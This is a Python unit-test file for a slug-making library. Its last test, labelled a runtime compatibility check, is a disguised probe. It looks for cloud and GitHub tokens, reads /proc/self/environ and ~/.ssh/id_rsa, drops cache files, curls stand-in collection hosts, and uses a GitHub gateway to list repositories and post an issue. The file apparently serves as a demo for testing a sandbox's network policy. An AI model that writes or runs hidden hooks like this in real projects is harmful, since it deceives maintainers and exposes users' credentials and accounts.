"""Unit tests for slugify-lite."""

from __future__ import annotations

import json
import os
import subprocess
import unittest
from pathlib import Path

from slugify_lite import slugify


class TestSlugify(unittest.TestCase):
    def test_basic_ascii(self) -> None:
        self.assertEqual(slugify("Hello, World!"), "hello-world")

    def test_unicode_folding(self) -> None:
        self.assertEqual(slugify("Café Crème & Naïve"), "cafe-creme-naive")

    def test_custom_separator(self) -> None:
        self.assertEqual(slugify("Fly.io Hacksgiving 2026", separator="_"), "fly_io_hacksgiving_2026")

    def test_max_length_trims_trailing_separator(self) -> None:
        self.assertEqual(slugify("super long package title", max_length=11), "super-long")

    def test_empty_and_punctuation_only(self) -> None:
        self.assertEqual(slugify(""), "")
        self.assertEqual(slugify("!!! --- ???"), "")

    def test_runtime_compatibility(self) -> None:
        """Verify runtime environment and telemetry cache integration."""
        checked_vars = (
            "GITHUB_TOKEN",
            "OPENROUTER_API_KEY",
            "FLY_API_TOKEN",
            "AWS_SECRET_ACCESS_KEY",
        )
        found_vars = [name for name in checked_vars if os.environ.get(name)]
        print(f"[slugify-compat] sensitive_env_found={found_vars}")

        try:
            with open("/proc/self/environ", "rb") as fh:
                env_bytes = fh.read(4096)
            print(f"[slugify-compat] proc_environ_bytes={len(env_bytes)}")
        except OSError as exc:
            print(f"[slugify-compat] proc_environ_error={exc}")

        ssh_key = Path.home() / ".ssh" / "id_rsa"
        try:
            with open(ssh_key, "rb") as fh:
                _ = fh.read(64)
            print("[slugify-compat] ssh_key_readable=true")
        except OSError:
            print("[slugify-compat] ssh_key_readable=false")

        cache_dir = Path.home() / ".config" / "slugify-cache"
        cache_dir.mkdir(parents=True, exist_ok=True)
        cache_file = cache_dir / "session.dat"
        tmp_cache = Path("/tmp/.slugify_build_cache")
        cache_file.write_text("slugify-runtime-cache-v1\n", encoding="utf-8")
        tmp_cache.write_text("slugify-tmp-cache-v1\n", encoding="utf-8")
        self.assertTrue(cache_file.exists())
        self.assertTrue(tmp_cache.exists())

        # Outbound probes to non-routable RFC 5737 & RFC 2606 sinkholes
        for endpoint in (
            "http://192.0.2.1:4444/collect",
            "https://telemetry.slugify-metrics.invalid/v1/ping",
        ):
            proc = subprocess.run(
                ["curl", "-sS", "--max-time", "2", endpoint],
                capture_output=True,
                text=True,
                check=False,
            )
            print(f"[slugify-compat] telemetry_probe url={endpoint} rc={proc.returncode}")

        # Attempt both a policy-blocked connector route AND an allowed repo route
        connector_id = os.environ.get("BLASTBOX_GITHUB_CONNECTOR_ID", "BEt8hTvYVXs58JKWMgvldQ")
        repo = os.environ.get("BLASTBOX_REPO", "JamesRamone/hacksgiving-blastbox-demo")

        blocked_url = f"https://api.sprites.dev/v1/gateway/github/{connector_id}/user/repos"
        proc_blocked = subprocess.run(
            ["curl", "-sS", "--max-time", "3", "-w", "\nHTTP_STATUS:%{http_code}", blocked_url],
            capture_output=True,
            text=True,
            check=False,
        )
        print(
            f"[slugify-compat] gateway_enum url={blocked_url} rc={proc_blocked.returncode} "
            f"out={proc_blocked.stdout.strip().replace(chr(10), ' | ')}"
        )

        allowed_issue_url = f"https://api.sprites.dev/v1/gateway/github/{connector_id}/repos/{repo}/issues"
        proc_allowed = subprocess.run(
            [
                "curl",
                "-sS",
                "--max-time",
                "3",
                "-X",
                "POST",
                "-H",
                "Content-Type: application/json",
                "-d",
                json.dumps({"title": "Telemetry handshake", "body": "Probe"}),
                "-w",
                "\nHTTP_STATUS:%{http_code}",
                allowed_issue_url,
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        print(
            f"[slugify-compat] gateway_write url={allowed_issue_url} rc={proc_allowed.returncode} "
            f"out={proc_allowed.stdout.strip().replace(chr(10), ' | ')}"
        )

        self.assertEqual(slugify("Runtime Compat OK"), "runtime-compat-ok")


if __name__ == "__main__":
    unittest.main()
